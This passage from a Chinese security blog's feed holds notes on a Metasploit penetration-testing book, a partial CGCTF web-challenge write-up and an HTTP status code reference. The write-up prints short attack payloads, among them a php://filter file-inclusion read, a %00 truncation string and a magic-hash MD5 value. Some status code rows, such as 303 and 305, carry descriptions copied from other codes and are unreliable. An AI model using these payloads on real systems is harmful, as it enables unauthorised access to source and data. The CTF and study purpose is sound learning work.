对一个你感兴趣的个人网站进行DNS、IP与位置的信息查询，找出网络运营者的联系方式，宿主服务器与所在位置等信息。撰写一份简单的调查报告</font></p><p>2&gt; <font color = "Brown"> 利用搜索引擎或相关工具对 <a href="http://testfire.net">testfire.net</a> <a href="http://www.dvssc.com">www.dvssc.com</a> 网站进行更加细致的搜索与侦查，发现更多敏感信息泄露与web安全漏洞 </font></p><p>3&gt; <font color = "Brown"> 端口扫描练习：补全表3-1 </font></p><p>4&gt; <font color = "Brown"> 漏洞扫描练习：补全表3-3 </font></p><p>5&gt; <font color = "Brown"> 数据共享练习：将3、4的扫描结果存储在数据库内 </font></p><h2 id="b-第四章-b"><b>第四章</b></h2><p>从第四章开始，进入到渗透步骤的攻击阶段，</p><p>第四章主要讲解web方面的攻击。<br>个人感觉第四章是看的最云里雾里的一章...一是所讲工具有些已经不能使用，并且工具的使用讲的较为粗略；二是结构上有点不太适应...感觉没有前几章读起来逻辑性更好一些，实战部分只挑了DVWA的四个样例；webshell代码解析倒是很详细，但是看不懂啊orz...</p><p><b>第四章小结：</b></p><blockquote><p>1.web安全引起重视的原因?<br>2.OWASP 是什么组织?其每年发布的top 10 都有哪些?<br>3.提升:web开源工具了解?<br>4.提升:kali内web安全工具了解?<br>5.通过dvwa/owasp top10 ，对各种web漏洞的原理了解，尝试编写自己的攻击模块?</p></blockquote><p><b>DMZ区：</b><br>DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail，等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。</p><p><b>web攻击迅速发展的7大理由：</b><br>1.广泛性：web应用存在于广大网络中。<br>2.技术门槛低：Lamp、IIS+ASP、.NET等。<br>3.防火墙策略可绕<br>4.安全机制不够成熟：HTTP发展处于滞后阶段。<br>5.隐蔽性：难以取证。<br>6.变化性：由于业务和服务增加或修改，可能会因为调用不当导致出现验证漏洞。<br>7.利益性：web攻击的利益丰厚</p><p><b>OWASP TOP10:</b><br>1.SQL注入：手注、盲注<br>2.跨站脚本：XSS(Cross-Site Scripting) 分为存储型XSS、反射型XSS、DOM型XSS。<br>3.跨站伪造请求：CSRF(Cross-Site Request Forgery) 是XSS的一种衍生。<br>4.会话认证管理缺陷：BASM(Broken Authenitication and Session Managament) Cookie缺陷。<br>5.安全配置错误：常用服务设置错误。<br>6.不安全的密码存储：例如明文密码，算法key未处理或保护不当。<br>7.不安全的参考对象：读取任意文件或资料。<br>8.限制URL失败：如描述，限制失败。<br>9.缺乏传输层保护：网络传输过程中被监听。缺乏SSL/TLS等保护机制。<br>10.未验证的重定向和跳转</p><p><b>web扫描工具：</b></p><p>Metasploit:辅助模块：auxiliary；渗透模块：exploit。<br>第三方：W3AF、SQLmap、wXf、XSSF、BeEF<br>开源扫描器：W3AF、Arachni、Grabber、Wapiti(sql)、Zed Attack Proxy、Skipfish、Sandcat Free Edithin(xss)、Paros、burpsuite、WATOBO(FUZZ)。</p><p><b>W3AF：</b><br>W3AF(Web Application Attack and Audit Framework)是一个综合性的扫描器。其主要分为核心模块和插件模块。<br>核心模块用于进程调度和插件使用；插件分为八类：发现、审计、搜索、攻击、输出、修改、入侵、破解。<br>W3AF也包含两种工作模式：命令行、GUI<br>同样这里不对工具进行过多赘述。详见W3AF工具讲解。</p><blockquote><p>这个工具的安装搞了我一天的时间...为了这玩意还重装了一下虚拟机...这本书对这个工具的使用不是很多，希望在后面学习使用时物有所值吧...</p></blockquote><p><b>SQLmap：</b><br>SQLmap是一款基于Python2的命令行自动注入工具。Kali自带，这里提一下在Metasploit内使用SQLmap</p><blockquote><p>2022-02-23修正：当年读这本书的时候sqlmap还不支持py3。现在早就已经支持了.....</p></blockquote><p><code>msf -&gt; use auxiliary/scanner/http/sqlmap</code><br><code>msf (sqlmap) -&gt; show options</code></p><p><b>其他：</b><br>对于书中所讲解的其他几个工具：如wXf(费了好大的力气找到的资源...)、xssf(这个更坑，据说已经停止更新和维护了，对metasploit兼容性越来越差)...由于略微的有一点年代感，在本章练习dvwa和owasp top10 中会学习近些时间比较新的或者更加实用的工具来进行代替。</p><p><b>第四章作业</b><br>1&gt; <font color = "Brown"><a href="http://xn--www-855fm2v.testfire.net">查找www.testfire.net</a> 中存在的sql注入,应用sqlmap等工具或是手动注入</font></p><p>2&gt; <font color = "Brown">添加xssf模块，完成一次存储型跨站&quot;钓鱼&quot;</font></p><p>3&gt; <font color = "Brown">通过wXf扫描wordpress和joomla两个模块进行RFI攻击</font></p><p>4&gt; <font color = "Brown">从exploit-db上找一个wordpress漏洞搭建一个漏洞环境，通过metasploit进行攻击</font></p><p>5&gt; <font color = "Brown">在DVWA中实践并理解安全配置及漏洞原理</font></p><p>6&gt; <font color = "Brown">尝试使用sqlmap进行shell注入</font></p><p>7&gt; <font color = "Brown">尝试向metasploit中加入网上的web渗透模块并搭建测试环境进行测试</font></p><h2 id="b-第五章-b"><b>第五章</b></h2><p>第五章讲述网络服务的渗透攻击，重点在于对所给实例的漏洞的分析过程的学习，这里和第六章先放一下，涉及了很多的汇编和二进制问题。<br>其主要介绍漏洞有：MS08-067、CVE-2009-1979、OSVDB-59110、</p><p>开始依旧是扫盲。</p><p><b>内存攻击：</b><br>攻击者利用软件安全漏洞构造恶意输入导致软件处理数据产生非预期错误，将数据写入特定的敏感位置从而劫持软件控制流量，执行外部代码。</p><p><b>缓冲区溢出漏洞：</b><br>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。<br>根据溢出内存位置不同，缓冲区溢出分为栈溢出和堆溢出。</p><p><b>栈溢出：</b><br>栈溢出指当写入数据超过内存分配给栈的缓冲区空间。会导致覆盖缓冲区附近的变量从而改变程序流程和结果；或是覆盖保存的函数地址修改为指定的地址；还有可能覆盖掉某个指针或者程序异常处理结构。<br>覆盖返回地址的利用方式是在函数进行调用时覆盖掉函数返回指针所指向的地址，从而达到调用shellcode的目的；<br>覆盖异常处理的利用方式</p><h2 id="b-第六章-b"><b>第六章</b></h2><p>第六章讲述的是客户端的渗透攻击。包含了常用的客户端软件如：浏览器、office、Adobe等。<br>主要的漏洞有：MS11-050、MS10-087。</p><p>同第五章，这一部分在开始学习逆向之后补齐。</p><h2 id="b-第七章-b"><b>第七章</b></h2><p>第七章讲社工，这一部分还是蛮有意思的。<br>说到社工，就不得不提凯文.米特尼克...和《欺骗的艺术》(虽然到现在我还没有看过，近期补上)。还有一本人性的弱点。</p><p>讲道理社工是一门博大精深的学问，个人觉得可以通过一些逻辑小游戏或者海龟汤故事之类的锻炼叙述一个故事或情景模拟。</p><p>从原理上来说，社会工程学（Social Engineering），是一种通过人际交流的方式获得信息的非技术渗透手段。他利用对象的心理弱点、人类的本能反应和好奇心等心理特征，进行欺骗、冒充、引诱等多种手段达成目的。</p><p>社工最重要的还是在进行之前的信息搜集。你能取得越多的信息，对于你获取信任的可能性就越大。</p><p>书中描述了一个社会工程学的环节框架：</p><p>1.信息搜集<br>2.诱导<br>3.托词<br>4.心理影响</p><p>在PC端对社工能够起到帮助的有：网络电话、木马、钓鱼网站的伪造、U盘攻击等等。</p><p><b>网络电话</b></p><p><b>木马</b><br>msfpayload</p><p><b>钓鱼</b><br>set工具</p><p><b>U盘攻击</b><br>autorun.inf<br>UItraISO<br>Hacksaw<br>Switchblade</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Metasploit渗透测试魔鬼训练营渗透.pdf : <a href="https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf">https://github.com/Urinx/Books/raw/master/metasploit/Metasploit渗透测试魔鬼训练营.pdf</a><br>1.PTES : <a href="http://www.pentest-standard.org">http://www.pentest-standard.org</a><br>2.原文链接 : <a href="https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/">https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/</a><br>3.站长之家 : <a href="http://whois.chinaz.com">http://whois.chinaz.com</a><br>4.IP2Location地址查询 : <a href="https://www.maxmind.com">https://www.maxmind.com</a><br>5.netcraft信息查询 : <a href="http://searchdns.netcraft.com">http://searchdns.netcraft.com</a><br>6.IP2反查域名 : <a href="http://site.ip138.com/">http://site.ip138.com/</a><br>7.站长工具 : <a href="http://www.7c.com/">http://www.7c.com/</a><br>8.SiteDigger : <a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a><br>9.Search Diggity : <a href="http://www.stachliu.com">http://www.stachliu.com</a><br>10.Search Diggity New : <a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/">http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/</a><br>11.GHDB : <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a><br>12.纯真数据库 : <a href="http://www.cz88.net/">http://www.cz88.net/</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Metasploit渗透测试魔鬼训练营渗透笔记&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2019-1-30&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf&quot;&gt;Metasploit渗透测试魔鬼训练营渗透.pdf&lt;/a&gt;&lt;/p&gt;
&lt;!-- split --&gt;
&lt;p&gt;日常写点什么&lt;br&gt;
寒假开始一周多，想把这本搞了快半年的书彻底的读完。&lt;br&gt;
写一个小总结似的笔记，把书里的课后习题和镜像练习实验都一遍。&lt;br&gt;
也附带的写一下遇到的坑点和心得吧。&lt;br&gt;
调整了一下结构，把每一章的小结都放到了开始部分，希望以后复习时候可以一口气回答出这些问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="笔记" scheme="http://blog.dvkunion.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透测试" scheme="http://blog.dvkunion.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CGCTF - 部分WP</title>
    <link href="http://blog.dvkunion.cn/2019/01/21/CGCTF/"/>
    <id>http://blog.dvkunion.cn/2019/01/21/CGCTF/</id>
    <published>2019-01-21T14:51:53.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>CGCTF</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>寒假也开始刷题了...从简单的南邮大佬开始刷起吧...</p><h3 id="b-0x01-WEB-b"><b>0x01- - WEB</b></h3><p><b> 001 签到题</b></p><p>页面询问 key在哪里 打开F12 html注释里得到flag</p><p><b> 002 md5 collision </b></p><p>明显的弱等于和md5 0e科学计数法漏洞<br>放一个payload :s1885207154a</p><p><b> 003 签到2</b></p><p>要求输入一个口令，却发现输入框限制比要求的少了一位，F12改maxlength即可</p><p><b> 004 这题不是WEB</b></p><p>找了一圈啥也没找到，最后下载那个动图扔HEX，图片最后即得Flag</p><p><b> 005 层层递进 </b></p><p>最喜欢的就是这道题<br>Bp爬一下这个题目，会发现四个页面，flag就隐藏在404页面的大段注释的js代码（藏头）</p><p><b> 006 AAencode</b></p><p>题目名字直接告诉你了，扔AAdecode解码即可<br><a href="https://tool.zcmzcm.org/aadecode">https://tool.zcmzcm.org/aadecode</a><br>有个问题是浏览器打开好像乱码了，需要直接下载txt打开。<br>顺带一提chrome控制台可以直接解码...</p><p><b> 007 单身20年</b></p><p>Bp抓包查看302页面即可</p><p><b> 010 php decode</b></p><p>放出了源码，本地跑一下就行。<br>eval函数好像不起作用，换成echo就好了</p><p><b> 011 文件包含 </b></p><p>本地文件上传漏洞,点击之后明显的看到url：?file=show.php<br>构造payload直接查看index.php源码即得flag<br>payload:file=php://filter/read=convert.base64-encode/resource=./index.php<br>读出源码base64解密</p><p><b>012 单身一百年也没用(感受出题人的恶意..)</b></p><p>依旧抓包<br>key藏在了302页面响应头中</p><p><b> 013 Download~ !</b></p><p>题目打不开了。。。。</p><p><b> 014 Cookie </b></p><p>hint给的很足，抓包直接将cookie改为1即可</p><p><b> 015 MYSQL  </b></p><p>现根据提示进入robots.txt看到源码</p><p>可以明显的看到用意：flag存在id=1024内但是输入的id不能是1024</p><p>看到intval函数</p><p>小数绕过即可</p><p><b> 016 GBK Injection </b></p><p>宽字节注入，这题还没搞懂。</p><p><b> 017 /x00 </b></p><p>明显的%00截断...数组也可以绕过<br>数组绕过的是strops函数，而%00是绕过了ereg函数<br>正常payload:nctf=1%00%23biubiubiu</p><p><b> 020 bypass again </b></p><p>弱类型 ==</p><p><b> 021 变量覆盖 </b></p><p>这题也没有做出来，思考的方向错了。<br>看了别人的题解，post提交后覆盖掉$thepassword_123即可。</p><p><b> 022 PHP是世界上最好的语言  </b></p><p>也挂掉了...</p><p><b> 023 伪装者</b></p><p>以为是改X-forwarded-for，结果没用</p><p><b> 024 Header </b></p><p>F12查看head...</p><p><b> 025 上传绕过</b></p><p>要求上传php但是只能上传图片格式文件<br>BP抓包改hex 使用00截断</p><p><b> 026 SQL注入1</b></p><p>直接查看了源码，sql查询语句：<br>$sql=&quot;select user from ctf where (user='&quot;.$user.&quot;') and (pw='&quot;.$pass.&quot;')&quot;;<br>这里犯了一个错误...没有使用)将语句封闭，导致一直报错。<br>还有个奇怪的地方</p><p><b> 027 pass check </b></p><p>源码给出，要求过掉strcmp函数<br>数组直接过掉</p><p><b> 030 起名字真难 </b></p><p>同样给出源码<br>要求一个key，key的每一个数字的值的acsii不能大于等于1小于等于9，并且要求key = '54975581388'</p><p>依旧是弱类型，==会把两个变量转换为相同的类型再进行比较</p><p><b> 031 密码重置</b></p><p>一开始以为是get和post的覆盖。。。直接把用户名改为admin 的base64重发就OK了</p><p><b> 032 php 反序列化(暂时无法做) </b></p><p>无题目。</p><p><b> 033 SQL Injection </b></p><p>打开只有Invalid password!</p><p>F12查看页面源码找到提示：使用admin登录</p><p><b> 034 综合题</b></p><p>打开一堆fuckjs，扔console给出了一个页面<br>页面提示tips在脑子里，脑子=head<br>查看head,tips：history of bash<br>Linux下history命令会生成.bash_history文件，<br>查看发现存在一个flagbak的Zip，访问下载，解压得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CGCTF&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;寒假也开始刷题了...从简单的南邮大佬开始刷起吧...&lt;/p&gt;
&lt;h3 id=&quot;b-0x01-WEB-b&quot;&gt;&lt;b&gt;0x01- - WEB&lt;/b&gt;&lt;/h3&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP状态码</title>
    <link href="http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>http://blog.dvkunion.cn/2019/01/17/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2019-01-17T21:28:48.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>HTTP状态码</h1><!-- split --><p>简单记录一下常用的http状态码表示的含义</p><span id="more"></span><h3 id="b-0x00-概念-b"><b>0x00- - 概念</b></h3><p>HTTP状态码（英语：HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。这是表示使用HTTP协议（HyperText Transfer Protocol，超文本传输协议）客服端的请求做出反应的三位数字码。<br>HTTP状态根据开头的第一个数字分为5类。后面两个数字没有分类的作用。</p><h3 id="b-0x01-1xx-信息类状态码-b"><b>0x01- - 1xx 信息类状态码</b></h3><p>这类状态码表示服务器已经收到了请求，需要请求者继续执行操作。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switch Protrol</td><td>切换协议，根据客户端的请求切换协议，只能由下至上的切换</td></tr><tr><td>102</td><td>Processing</td><td>由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行</td></tr></tbody></table><h3 id="b-0x02-2xx-成功类状态码-b"><b>0x02- - 2xx 成功类状态码</b></h3><p>这类状态码表示服务器已经接受了请求并成功地处理了请求</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成,如果201所处理的请求无法及时建立，则返回该状态码</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求,类似迅雷等下载工具的下载大文件方式</td></tr><tr><td>207</td><td>Multi-Status</td><td>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td></tr></tbody></table><p>206请求头部必须包含Range头信息，并有可能含有IF-Range作为条件请求。<br>响应必须包含如下的头部域：<br>　　Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。<br>　　Date<br>　　ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。<br>　　Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>　　假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。<br>　　假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。<br>　　任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。</p><h3 id="b-0x03-3xx-重定向类状态码-b"><b>0x03- - 3xx 重定向类状态码</b></h3><p>这类状态码表示服务器需要进一步操作来完成请求。<br>用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A-&gt;A，或者A-&gt;B-&gt;C-&gt;A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过5次的重定向。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>请非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr></tbody></table><h3 id="b-0x04-4xx-外部错误类状态码-b"><b>0x04- - 4xx 外部错误类状态码</b></h3><p>这类状态码通常指客户端发送的发生了错误，妨碍了服务器的处理、请求包含语法错误或无法完成请求。</p><h3 id="b-0x05-5xx-内部错误类状态码-b"><b>0x05- - 5xx 内部错误类状态码</b></h3><p>这类状态码通常指服务器在处理请求的过程出现了错误或者有异常发生。也可能是服务器意识到无法处理这个请求。<br>5xx的状态码适用于任何响应方法。</p><table><thead><tr><th>代码号</th><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求，一般是服务器代码出现问题</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误</td></tr><tr><td>507</td><td>Insufficient Storage</td><td>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</td></tr><tr><td>509</td><td>Bandwidth Limit Exceeded</td><td>服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td></tr><tr><td>510</td><td>Not Extended</td><td>获取资源所需要的策略并没有没满足。（RFC 2774）</td></tr></tbody></table><h3 id="b-0x06-其他状态码-b"><b>0x06- - 其他状态码</b></h3><p>208 已经报告<br>一个DAV的绑定成员被前一个请求枚举，并且没有被再一次包括。</p><p>226 IM Used<br>服务器已经满足了请求所要的资源，并且响应是一个或者多个实例操作应用于当前实例的结果。</p><p>308 永久转移<br>这个请求和以后的请求都应该被另一个URI地址重新发送。307、308和302、301有相同的表现，但是不允许HTTP方法改变。例如，请求表单到一个永久转移的资源将会继续顺利地执行。</p><p>418 我是一个茶壶<br>这个代码是在1998年作为传统的IETF April Fools‘ jokes被定义的在RFC2324，超文本咖啡罐控制协议，但是并没有被实际的HTTP服务器实现。RFC指定了这个代码应该是由茶罐返回给速溶咖啡。</p><p>419 认证超时<br>并不是HTTP标注的一部分，419认证超时表示以前的有效证明已经失效了。同时也被用于401未认证的替代选择为了从其它被拒绝访问的已认证客户端中指定服务器的资源。</p><p>420 方法失效<br>不是HTTP的标准，但是被Spring定义在HTTP状态类中当方法失时使用。这个状态码已经不推荐在Spring中使用。</p><p>420 提高你的耐心<br>也不是HTTP标准的一部分，但是被版本1的Twitter搜索和趋势APi返回当客户端的速率被限制的时候。其它的服务提供商可能会使用429太多的请求响应码来代替。</p><p>428 需要前置条件<br>原始服务器需要有条件的请求。当客户端GET一个资源的状态的时候，同时又PUT回给服务器，与此同时第三方修改状态到服务器上的时候，为了避免丢失更新的问题发生将会导致冲突。</p><p>429 过多请求<br>用户已经发送了太多的请求在指定的时间里。用于限制速率。</p><p>431 请求头部字段太大<br>服务器由于一个单独的请求头部字段或者是全部的字段太大而不愿意处理请求。</p><p>440 登陆超时（微软）<br>一个微软的扩展，意味着你的会话已经超时。</p><p>444 无响应<br>被使用在Nginx的日志中表明服务器没有返回信息给客户端并且关闭了连接（在威慑恶意软件的时候比较有用）。</p><p>449 重试（微软）<br>一个微软的扩展。请求应该在执行适当的动作之后被重试。</p><p>450 被Windows家长控制阻塞（微软）<br>一个微软的扩展。这个错误是当Windows家长控制打开并且阻塞指定网页的访问的时候被指定。</p><p>451 由于法律原因而无效（因特网草稿）<br>被定义在因特网草稿“一个新的HTTP状态码用于法律限制的资源”。被用于当资源的访问由于法律原因被禁止的时候。例如检查制度或者是政府强制要求禁止访问。一个例子是1953年dystopian的小说Fahrenheit 451就是一个非法的资源。</p><p>451 重定向（微软）<br>被用在Exchange ActiveSync中如果一个更有效的服务器能够被使用或者是服务器不能访问用户的邮箱。</p><p>客户端会假定重新执行HTTP自动发现协议去寻找更适合的服务器。</p><p>494 请求头太大（Nginx）<br>Nginx内置代码和431类似，但是是被更早地引入在版本0.9.4（在2011年1月21日）。</p><p>495 证书错误（Nginx）</p><p>Nginx内置的代码，当使用SSL客户端证书的时候错误会出现为了在日志错误中区分它和4XX和一个错误页面的重定向。。</p><p>496 没有证书（Nginx）<br>Nginx内置的代码，当客户端不能提供证书在日志中分辨4XX和一个错误页面的重定向。</p><p>497 HTTP到HTTPS（Nginx）<br>Nginx内置的代码，被用于原始的HTTP的请求发送给HTTPS端口去分辨4XX在日志中和一个错误页面的重定向。</p><p>498 令牌超时或失效（Esri）<br>由ArcGIS for Server返回。这个代码意味着令牌的超时或者是失效。</p><p>499 客户端关闭请求（Nginx）<br>被用在Nginx日志去表明一个连接已经被客户端关闭当服务器仍然正在处理它的请求，是的服务器无法返货状态码。</p><p>499 需要令牌（Esri）<br>由ArcGIS for Server返回。意味着需要一个令牌（如果没有令牌被提交）。</p><p>508 发现环路<br>服务器发现了一个无限的循环档处理请求的时候。</p><p>511 需要网络授权<br>客户端需要授权去火的网络的访问权限。一般用于代理交互中被用来进行网络的访问控制。</p><p>520 未知错误<br>这个状态码也没有被指定在任何RFC中，并且只会被一些服务器返回，例如微软的Azure和CloudFlare服务器:”520错误本质上是一个捕获全部的响应当原始服务器返回一些未知的或者一些不能被忍受或者被解释的(协议违反或者空响应)”。</p><p>598 网络读取超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络读取超时在一个客户端之前的代理的后面。</p><p>599 网络连接超时异常(未知)<br>这个状态码也没有在任何RFC中指定，但是被用在微软的HTTP代理中去标注一个网络连接超时在一个客户端之前的代理的后面。</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;HTTP状态码&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;简单记录一下常用的http状态码表示的含义&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Linux--KaLi</title>
    <link href="http://blog.dvkunion.cn/2018/12/04/Linux-KaLi/"/>
    <id>http://blog.dvkunion.cn/2018/12/04/Linux-KaLi/</id>
    <published>2018-12-04T14:56:10.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux--KaLi</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言<b></h3><p>咳咳,一直想要把KaLi里面的东西好好的整理一下，毕竟能省去很多复杂的操作时间。（其实就是图书馆借的书马上得换了赶紧翻两页写个笔记好了Orz...）<br>相比普通的Linux，KaLi集成了大量的渗透工具。是一个相当于什么都给你准备好的大型工具箱，能简化我们大量的安装时间。</p><blockquote><p>&quot;工欲善其事，必先利其器&quot;</p></blockquote><h3 id="b-0x01-KaLi简介-安装-b"><b>0x01- - KaLi简介&amp;安装<b></h3><p>还是从这个东西的历史开始了解。</p><p>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。<br>Kali 也是一个简便的安全解决方案。Kali 并不要求你自己去维护一个 Linux 系统，或者你自己去收集软件和依赖项。你只需要专注于要审计的真实工作上，而不需要去考虑准备测试系统。</p><p>至于安装，我这里选择在虚拟机内搭建一个kali环境作为测试。</p><p>安装方法与普通的Linux系统并无区别，这里不再赘述。在<a href="http://www.kali.org/">官网</a>下载镜像扔进虚拟机即可。<br>还是加一个注释吧：-i386 是 32位系统的镜像包，amd64 是 64位系统的安装包</p><p>KaLi 也可以安装到U盘/SD卡，甚至是ARM设备中。</p><h3 id="b-0x02-KaLi前期准备-b"><b>0x02- - KaLi前期准备<b></h3><h4 id="font-color-blue-软件包的安装-font-br"><font color = 